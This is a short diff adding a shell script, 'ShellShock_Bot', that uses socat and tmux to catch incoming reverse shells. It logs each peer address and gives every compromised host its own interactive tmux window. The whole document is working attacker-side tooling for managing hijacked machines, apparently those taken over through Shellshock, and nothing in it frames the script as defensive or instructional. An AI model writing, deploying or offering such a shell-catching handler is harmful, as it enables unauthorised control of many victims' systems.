@@ -1,0 +1,8 @@
+#!/bin/sh
+tmux has-session -t ShellShock_Bot 2>/dev/null \
+  || tmux new-session -d -s ShellShock_Bot "cat>/dev/null" \; rename-window info
+tmux send-keys -t ShellShock_Bot:info "$(date '+%Y-%m-%d %H:%M:%S') Received a shell from $SOCAT_PEERADDR" Enter
+mkdir /tmp/ShellShock_Bot 2>/dev/null
+tmux new-window -d -t ShellShock_Bot -n "$SOCAT_PEERADDR" \
+  "sleep 1; stty -echo raw; socat unix-client:/tmp/ShellShock_Bot/$$.sock -; stty sane; echo; echo EOF; read"
+socat unix-listen:/tmp/ShellShock_Bot/$$.sock -
